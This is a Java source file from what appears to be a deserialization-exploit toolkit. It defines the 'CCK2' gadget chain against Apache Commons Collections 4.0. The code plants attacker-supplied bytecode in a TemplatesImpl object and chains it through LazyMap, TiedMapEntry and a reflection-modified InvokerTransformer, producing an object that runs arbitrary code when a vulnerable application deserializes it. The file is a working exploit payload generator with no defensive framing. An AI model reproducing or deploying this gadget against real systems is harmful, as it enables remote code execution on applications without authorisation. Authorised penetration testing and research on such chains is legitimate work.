package com.bcvgh.core.unser.gadgets.exec;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.CustomPayload;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-4.0")
@RequireParameter("Command")
public class CCK2 implements CustomPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        TemplatesImpl obj=new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{unSerInput.getBytecode()});
        setFieldValue(obj,"_name","HelloT");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        Transformer transformer = new InvokerTransformer("toString", null, null);
//        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap=new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap, transformer);
        TiedMapEntry tme=new TiedMapEntry(outerMap,obj);
        Map expMap= new HashMap();
        expMap.put(tme,"valuevalue");
        outerMap.clear();

        Field f =
                transformer.getClass().getDeclaredField("iMethodName");
        f.setAccessible(true);
        f.set(transformer, "newTransformer");
        return expMap;
    }
}
